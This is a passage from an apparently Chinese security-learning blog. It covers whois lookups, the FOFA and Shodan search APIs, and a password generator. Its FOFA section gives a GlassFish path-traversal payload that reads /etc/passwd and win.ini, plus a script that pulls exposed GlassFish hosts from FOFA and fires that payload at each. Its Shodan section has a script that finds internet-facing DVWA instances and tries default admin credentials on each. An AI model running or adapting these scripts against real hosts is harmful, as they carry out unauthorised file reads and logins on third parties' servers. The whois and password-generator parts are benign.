class="hljs-string">&#x27;__main__&#x27;</span>:<br>    dms = [<br>        <span class="hljs-string">&#x27;baidu.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;zhihu.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;sadasdnjkbgadklbgads.com&#x27;</span><br>    ]<br>    <span class="hljs-keyword">for</span> dm <span class="hljs-keyword">in</span> dms:<br>        <span class="hljs-built_in">print</span>(dm,<span class="hljs-string">&quot; is registered&quot;</span> <span class="hljs-keyword">if</span> is_registered(dm) <span class="hljs-keyword">else</span> <span class="hljs-string">&quot; is not registered&quot;</span>)<br>        <br>        <br><span class="hljs-comment">#模块化：        </span><br><span class="hljs-keyword">import</span> whois<br><span class="hljs-keyword">from</span> validate_domains <span class="hljs-keyword">import</span> is_registered<br><br>domain_name = <span class="hljs-string">&quot;baidu.com&quot;</span><br><br><span class="hljs-keyword">if</span> is_registered(domain_name):<br>    whois_info = whois.whois(domain_name)<br>    <span class="hljs-built_in">print</span>(whois_info)<br>    <br></code></pre></td></tr></table></figure><h2 id="fofaAPI的使用"><a href="#fofaAPI的使用" class="headerlink" title="fofaAPI的使用"></a>fofaAPI的使用</h2><p>API接口文档：<a href="https://fofa.info/api">https://fofa.info/api</a></p><ul><li>普通查询</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">curl -X GET <span class="hljs-string">&quot;https://fofa.info/api/v1/search/all?email=xxx&amp;key=xxx&amp;qbase64=xxx&quot;</span><br><br><span class="hljs-comment">#python方式：</span><br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;https://fofa.info/api/v1/search/all?email=your_email&amp;key=fofa_api&amp;qbase64=query_sentence&quot;</span><br><br>res = requests.get(url)<br><span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><ul><li>host聚合</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">https://fofa.info/api/v1/host/<span class="hljs-number">103.41</span><span class="hljs-number">.167</span><span class="hljs-number">.234</span>?email=your_email&amp;key=your_key<br><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;https://fofa.info/api/v1/host/xxx.xxx.xxx.xxx?email=xxx&amp;key=xxx&quot;</span><br><br>res = requests.get(url)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230922210843955-1701333286922-3.png" alt="image-20230922210843955"></p><p><img src="/img/image-20230914112126185-1701333286922-4.png" alt="image-20230914112126185"></p><ul><li>sdk</li></ul><p><a href="https://github.com/fofapro/fofa-py">https://github.com/fofapro/fofa-py</a></p><p>下载解压  该目录下执行python .&#x2F;setup.py install</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> fofa<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    email, key = (<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment"># 输入email和key</span><br>    client = fofa.Client(email, key)                <span class="hljs-comment"># 将email和key传入fofa.Client类进行初始化和验证，并得到一个fofa client对象</span><br>    query_str = <span class="hljs-string">&#x27;header=&quot;thinkphp&quot; || header=&quot;think_template&quot;&#x27;</span><br>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">51</span>):                       <span class="hljs-comment"># 从第1页查到第50页</span><br>        <span class="hljs-comment"># fpoint = client.get_userinfo()[&quot;fofa_point&quot;]      # 查询F点剩余数量</span><br>        <span class="hljs-comment"># if fpoint &lt; 100:</span><br>        <span class="hljs-comment">#     break                                   # 当F点小于100时，不再获取数据</span><br>        <span class="hljs-keyword">try</span>:<br>            data = client.search(query_str, size=<span class="hljs-number">100</span>, page=page, fields=<span class="hljs-string">&quot;ip,city&quot;</span>)  <span class="hljs-comment"># 查询第page页数据的ip和城市</span><br>            <span class="hljs-keyword">for</span> ip, city <span class="hljs-keyword">in</span> data[<span class="hljs-string">&quot;results&quot;</span>]:<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;%s,%s&quot;</span>%(ip,city))             <span class="hljs-comment"># 打印出每条数据的ip和城市</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;账号信息错误&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="fofa实战"><a href="#fofa实战" class="headerlink" title="fofa实战"></a>fofa实战</h3><p>例子：<a href="https://www.secpulse.com/archives/42277.html">https://www.secpulse.com/archives/42277.html</a>  应用服务器glassfish任意文件读取漏洞</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sas">FOFA语法：<span class="hljs-string">&quot;glassfish&quot;</span> <span class="hljs-variable">&amp;&amp;</span> port=<span class="hljs-string">&quot;4848&quot;</span> <span class="hljs-variable">&amp;&amp;</span> country!=<span class="hljs-string">&quot;CN&quot;</span><br>linuxPOC:http://localhost:4848/theme/META-INF/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/etc/passwd<br><br>windowsPOC:http://localhost:4848/theme/META-INF/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/windows/win.ini<br><br></code></pre></td></tr></table></figure><img src="/img/image-20230915100934734-1701333286922-5.png" alt="image-20230915100934734" style="zoom:67%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#在sdk里执行</span><br><span class="hljs-keyword">import</span> fofa<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">#定义漏洞列表</span><br>vul_ips = []<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_vuln</span>(<span class="hljs-params">ips</span>):<br>    linux_POC = <span class="hljs-string">&#x27;/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&#x27;</span><br>    windows_POC = <span class="hljs-string">&#x27;/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&#x27;</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ips:<br>        ip = i.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-comment">#换行替换为空</span><br>        windows_url = <span class="hljs-string">&quot;http://&quot;</span>+ip+<span class="hljs-string">&quot;:4848&quot;</span>+windows_POC<br>        linux_url = <span class="hljs-string">&quot;http://&quot;</span>+ip+<span class="hljs-string">&quot;:4848&quot;</span>+linux_POC<br><br>        <span class="hljs-keyword">try</span>:<br>            vuln_code_linux = requests.get(linux_url).status_code<br>            vuln_code_windows = requests.get(windows_url).status_code<br>            <span class="hljs-keyword">if</span> vuln_code_linux == <span class="hljs-number">200</span> <span class="hljs-keyword">or</span> vuln_code_windows == <span class="hljs-number">200</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] ip:&quot;</span>+ip+<span class="hljs-string">&quot;存在glassfish任意文件读取漏洞&quot;</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    email, key = (<span class="hljs-string">&#x27;xxx&#x27;</span>, <span class="hljs-string">&#x27;xxxx&#x27;</span>)  <span class="hljs-comment"># 输入email和key</span><br>    client = fofa.Client(email, key)                <span class="hljs-comment"># 将email和key传入fofa.Client类进行初始化和验证，并得到一个fofa client对象</span><br>    query_str = <span class="hljs-string">&#x27;&quot;glassfish&quot; &amp;&amp; port=&quot;4848&quot; &amp;&amp; country!=&quot;CN&quot;&#x27;</span><br>    <br><br>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>):                       <span class="hljs-comment"># 从第1页查到第x页</span><br>        <span class="hljs-comment"># fpoint = client.get_userinfo()[&quot;fofa_point&quot;]      # 查询F点剩余数量</span><br>        <span class="hljs-comment"># if fpoint &lt; 100:</span><br>        <span class="hljs-comment">#     break                                   # 当F点小于100时，不再获取数据</span><br>        <span class="hljs-keyword">try</span>:<br>            data = client.search(query_str, size=<span class="hljs-number">10</span>, page=page, fields=<span class="hljs-string">&quot;ip&quot;</span>)  <span class="hljs-comment"># 查询第page页数据的ip</span><br>            <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> data[<span class="hljs-string">&quot;results&quot;</span>]:<br>                <span class="hljs-comment">#print (ip)             # 打印出每条数据的ip</span><br>                vul_ips.append(ip)<br>                <span class="hljs-comment">#print(vul_ips)</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;账号信息错误&quot;</span>)<br><br>check_vuln(vul_ips)<br></code></pre></td></tr></table></figure><h2 id="shodan实战"><a href="#shodan实战" class="headerlink" title="shodan实战"></a>shodan实战</h2><h3 id="shodan-python脚本文档"><a href="#shodan-python脚本文档" class="headerlink" title="shodan  python脚本文档"></a>shodan  python脚本文档</h3><p><a href="https://shodan.readthedocs.io/en/latest/">https://shodan.readthedocs.io/en/latest/</a></p><p><a href="https://github.com/achillean/shodan-python">https://github.com/achillean/shodan-python</a></p><p>以dvwa靶场为例</p><p>默认用户名密码：admin:password</p><p>思路：</p><p>1.使用shodan搜索dvwa  title:dvwa</p><p>2.使用默认用户密码+网页源码中的usertoken进行登录</p><img src="/img/image-20230915110636012-1701333286922-6.png" alt="image-20230915110636012" style="zoom: 67%;" /><p>post 登录语句:username&#x3D;admin&amp;password&#x3D;password&amp;Login&#x3D;Login&amp;user_token&#x3D;{token}</p><p>登录成功–302</p><p><img src="/img/image-20230915154636049-1701333286922-7.png" alt="image-20230915154636049"></p><p>Shodan.search()方法的返回值：</p><p><img src="/img/image-20230915183258357-1701333286922-8.png" alt="image-20230915183258357"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> shodan<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment">#shodankey</span><br>SHODAN_API_KEY = <span class="hljs-string">&quot;xxxx&quot;</span><br>api = shodan.Shodan(SHODAN_API_KEY)<br><br><br><span class="hljs-comment">#shodan搜索   返回第几页的搜索结果</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">request_shodan_api</span>(<span class="hljs-params">query,page=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-comment"># Wrap the request in a try/ except block to catch errors</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># Search Shodan</span><br>            instances = api.search(query,page=page)<br><br>            <span class="hljs-comment"># Show the results</span><br>            <span class="hljs-comment"># print(&#x27;Results found: &#123;&#125;&#x27;.format(results[&#x27;total&#x27;]))</span><br>            <span class="hljs-comment"># for result in results[&#x27;matches&#x27;]:</span><br>            <span class="hljs-comment">#         print(&#x27;IP: &#123;&#125;&#x27;.format(result[&#x27;ip_str&#x27;]))</span><br>            <span class="hljs-comment">#         #print(result[&#x27;data&#x27;])</span><br>            <span class="hljs-comment">#         #print(&#x27;&#x27;)</span><br>            <span class="hljs-keyword">return</span> instances    <span class="hljs-comment">#返回搜索结果</span><br><br>        <span class="hljs-keyword">except</span> shodan.APIError <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Error: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(e))<br>            time.sleep(<span class="hljs-number">5</span>)<br><br><span class="hljs-comment">#向目标网站发送请求  登录</span><br><span class="hljs-comment">#result为Shodan.search()方法的返回值中的matches字段的数据</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login_ip</span>(<span class="hljs-params">results</span>):<br>    <span class="hljs-comment">#判断协议是http还是https</span><br>    proto = (<span class="hljs-string">&#x27;ssl&#x27;</span> <span class="hljs-keyword">in</span> results) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;https&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;http&#x27;</span><br>    <span class="hljs-comment">#发起请求</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#print(f&quot;&#123;proto&#125;://&#123;results[&#x27;ip_str&#x27;]&#125;:&#123;results[&#x27;port&#x27;]&#125;/login.php&quot;)</span><br>        res = requests.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;proto&#125;</span>://<span class="hljs-subst">&#123;results[<span class="hljs-string">&#x27;ip_str&#x27;</span>]&#125;</span>:<span class="hljs-subst">&#123;results[<span class="hljs-string">&#x27;port&#x27;</span>]&#125;</span>/login.php&quot;</span>,verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">except</span> requests.exceptions.ConnectionError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> res.status_code != <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;目标不存在dvwa&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-comment">#获取token  发送post请求登录</span><br>    <span class="hljs-comment">#token = re.search(r&quot;user_token&#x27; value=&#x27;([0-9a-z]+)&#x27;&quot;,res.text).group(1)</span><br>    token1 = re.search(<span class="hljs-string">r&quot;user_token&#x27; value=&#x27;([0-9a-z]+)&#x27;&quot;</span>,res.text)<br>    <span class="hljs-keyword">if</span> token1:<br>        token=token1.group(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        token=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># try:</span><br>    <span class="hljs-comment">#     if token1:</span><br>    <span class="hljs-comment">#         token=token1.group(1)</span><br>    <span class="hljs-comment"># except:</span><br>    <span class="hljs-comment">#     print(&quot;匹配内容为空&quot;)</span><br>    res = requests.post(<br>        <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;proto&#125;</span>://<span class="hljs-subst">&#123;results[<span class="hljs-string">&#x27;ip_str&#x27;</span>]&#125;</span>:<span class="hljs-subst">&#123;results[<span class="hljs-string">&#x27;port&#x27;</span>]&#125;</span>/login.php&quot;</span>,<br>        <span class="hljs-string">f&quot;username=admin&amp;password=password&amp;Login=Login&amp;user_token=<span class="hljs-subst">&#123;token&#125;</span>&quot;</span>,<br>        allow_redirects=<span class="hljs-literal">False</span>,<br>        verify=<span class="hljs-literal">False</span>,<br>        headers=&#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;<br>        )<br>    <span class="hljs-comment">#登录成功会跳转到index.php</span><br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">302</span> <span class="hljs-keyword">and</span> res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>] == <span class="hljs-string">&#x27;index.php&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment">#page为Shodan.search()方法的返回值 查询结果的详情 </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_page</span>(<span class="hljs-params">page</span>):<br>    result = []<br>    <span class="hljs-keyword">for</span> instance <span class="hljs-keyword">in</span> page[<span class="hljs-string">&#x27;matches&#x27;</span>]:<br>        <span class="hljs-keyword">if</span> login_ip(instance):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+]存在默认口令：<span class="hljs-subst">&#123;instance[<span class="hljs-string">&#x27;ip_str&#x27;</span>]&#125;</span>:<span class="hljs-subst">&#123;instance[<span class="hljs-string">&#x27;port&#x27;</span>]&#125;</span>&quot;</span>)<br>            result.append(instance)<br>    <span class="hljs-keyword">return</span> result           <span class="hljs-comment">#返回存在默认用户名密码的ip列表</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">query_shodan</span>(<span class="hljs-params">query</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] 开始查询第一页&quot;</span>)<br>    first_page = request_shodan_api(query)  <span class="hljs-comment">#返回第一页查询结果</span><br>    total = first_page[<span class="hljs-string">&#x27;total&#x27;</span>]             <span class="hljs-comment">#数据总数</span><br>    already_processed = <span class="hljs-built_in">len</span>(first_page[<span class="hljs-string">&#x27;matches&#x27;</span>])  <br>    result = process_page(first_page)<br>    page = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> already_processed &lt; total:<br>        <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;正在查询第<span class="hljs-subst">&#123;page&#125;</span>页&quot;</span>)<br>        page = request_shodan_api(query,page=page)<br>        already_processed += <span class="hljs-built_in">len</span>(page[<span class="hljs-string">&#x27;matches&#x27;</span>])<br>        result += process_page(page)<br>        page += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> result<br><br>res = query_shodan(<span class="hljs-string">&#x27;title:dvwa&#x27;</span>)<br><span class="hljs-built_in">print</span>(res)<br><br></code></pre></td></tr></table></figure><h2 id="密码生成器"><a href="#密码生成器" class="headerlink" title="密码生成器"></a>密码生成器</h2><p>随机密码生成，例子：<a href="https://suijimimashengcheng.bmcx.com/">https://suijimimashengcheng.bmcx.com/</a></p><img src="/img/image-20230917153828063-1701333286922-10.png" alt="image-20230917153828063" style="zoom:67%;" /><h3 id="argparse模块"><a href="#argparse模块" class="headerlink" title="argparse模块"></a>argparse模块</h3><p><a href="https://zhuanlan.zhihu.com/p/539331146">python系列：argparse详解 - 知乎 (zhihu.com)</a></p><h3 id="string包含的属性"><a href="#string包含的属性" class="headerlink" title="string包含的属性"></a>string包含的属性</h3><img src="/img/image-20230917162312310-1701333286922-9.png" alt="image-20230917162312310" style="zoom: 50%;" /><img src="/img/image-20230917163807602-1701333286922-11.png" alt="image-20230917163807602" style="zoom:67%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser<br><span class="hljs-comment">#ArgumentParser解析命令行参数，并生成有用的帮助文档</span><br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> secrets      <span class="hljs-comment">#生成强随机数 </span><br><br><span class="hljs-comment">#存储生成的随机密码</span><br>passwords = []<br><br><span class="hljs-comment">#完全随机</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">createRandomPWD</span>(<span class="hljs-params">args</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.amount):<br>        <span class="hljs-comment">#secrets.choice功能与random.choice(seq)相同，从指定的非空序列中随机选择一个元素并返回</span><br>        passwords.append(<span class="hljs-string">&quot;&quot;</span>.join(<br>                [secrets.choice(string.digits+string.ascii_letters+string.punctuation)\<br>                <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.total_length)]))<br><br><span class="hljs-comment">#指定参数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">createArgumentPWD</span>(<span class="hljs-params">args</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.amount):<br>        password = []<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.numbers):<br>            password.append(secrets.choice(string.digits))<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.uppercase):<br>            password.append(secrets.choice(string.ascii_uppercase))<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.lowercase):<br>            password.append(secrets.choice(string.ascii_lowercase))<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.special_chars):<br>            password.append(secrets.choice(string.punctuation))<br>        <span class="hljs-comment">#random.shuffle用于将一个列表中的元素打乱顺序</span><br>        random.shuffle(password)<br>        password = <span 